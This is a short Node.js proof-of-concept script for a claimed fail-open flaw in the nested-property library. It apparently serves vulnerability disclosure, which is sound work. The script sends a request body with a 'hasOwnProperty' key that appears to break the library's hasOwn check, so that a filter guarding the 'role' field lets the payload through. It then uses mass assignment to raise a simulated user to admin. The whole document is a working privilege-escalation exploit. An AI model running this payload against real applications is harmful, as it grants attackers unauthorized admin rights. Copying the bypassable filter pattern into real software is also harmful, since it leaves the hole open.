const np = require("nested-property");

console.log("======================================================");
console.log("  nested-property v4.0.0: Fail-Open Error Handling PoC ");
console.log("======================================================\n");

// ---------------------------------------------------------
// VULNERABILITY: Fail-Open Error Handling enables Mass Assignment
// ---------------------------------------------------------

// Simulated backend objects
const req = {
  user: { role: "user", theme: "light" }, // Target object
  body: { // Attacker payload
    role: "admin", 
    theme: "dark", 
    hasOwnProperty: 1 // The trigger to cause the internal TypeError
  }
};

console.log("--- Initial State ---");
console.log("User:", req.user);
console.log("Payload:", req.body);

console.log("\n--- Executing Developer's Security Filter ---");
// The developer securely validates the payload to prevent Mass Assignment
if (np.hasOwn(req.body, "role")) {
  console.log("[BLOCKED] Forbidden property detected.");
} else {
  console.log("[ALLOWED] Payload validated. No forbidden properties found. Applying updates...");
  
  // The filter was bypassed due to the fail-open flaw. Updates are applied.
  for (const key of Object.keys(req.body)) {
    np.set(req.user, key, req.body[key]);
  }
}

console.log("\n--- Final User State ---");
console.log("User:", req.user);

// If the user's role is 'admin', the exploit chain was successful.
if (req.user.role === "admin") {
  console.log("\n[!] EXPLOIT SUCCESS: Security filter bypassed via fail-open bug.");
  console.log("    Mass Assignment / Privilege Escalation successfully achieved.");
} else {
  console.log("\n[-] Exploit failed. User role was protected.");
}

console.log("\n======================================================");
console.log("  PoC Execution Complete");
console.log("======================================================\n");
